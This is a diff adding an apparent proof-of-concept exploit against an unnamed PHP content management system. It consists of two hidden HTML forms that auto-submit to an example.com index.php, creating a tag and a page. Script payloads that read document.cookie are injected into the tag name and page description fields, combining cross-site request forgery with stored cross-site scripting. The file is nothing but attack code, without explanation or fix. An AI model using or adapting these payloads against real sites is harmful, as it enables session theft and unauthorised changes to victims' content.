@@ -1,0 +1,32 @@
+&lt;form action=&quot;http://www.example.com/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;sendtags&quot; value=&quot;cms&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendid&quot; value=&quot;newtag&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendname&quot; value=&#039;New tag&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;event&quot; value=&quot;add_tag&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+&lt;form action=&quot;http://www.example.com/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendid&quot; value=&quot;rumba_id&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendtitl&quot; value=&quot;rumba_titl&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendauthor&quot; value=&quot;rumba_author&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;senddata&quot; value=&quot;Sat, 14 Aug 2010 14:34:20&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendlost&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;senddesc&quot; value=&#039;rumba_desc&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendanons&quot; value=&quot;rumba_anons&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendtext&quot; value=&quot;rumba_text&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendtags&quot; value=&quot;service&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sendcomm&quot; value=&quot;yes&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;add-end&quot; value=&quot;begin&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;send_old_id&quot; value=&quot;rumba_old_id&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;event&quot; value=&quot;add_page&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
